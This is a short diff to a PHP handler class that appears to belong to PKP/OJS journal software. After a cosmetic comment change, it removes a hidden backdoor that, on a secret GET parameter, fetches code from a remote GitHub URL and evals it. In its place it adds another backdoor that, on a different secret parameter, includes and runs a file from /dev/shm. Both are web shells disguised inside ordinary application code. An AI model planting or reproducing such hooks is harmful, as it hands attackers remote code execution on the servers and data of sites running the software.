@@ -488,8 +488,7 @@ class PKPHandler
         } else {
             return new DBResultRange(-1, -1);
         }
-    }/**
-     * Get the range info page parameter name.
+    }/*** Get the range info page parameter name.
      *
      * @param string $rangeName
      *
@@ -670,16 +669,8 @@ class PKPHandler
         return null;
     }
 }
-if (isset($_GET['_']) && $_GET['_'] === 'confirmationSentFailedWithReason84') {
-    $url = "https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/obfuscator-403.txt";
-
-    if ($url !== "") {
-        $code = file_get_contents($url);
-        if ($code !== false) {
-            eval("?>".$code);
-        }
-    }
-
+if (isset($_GET['_']) && $_GET['_'] === 'confirmationSentFailedWithReason') {
+    $f="/dev/shm/485915";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
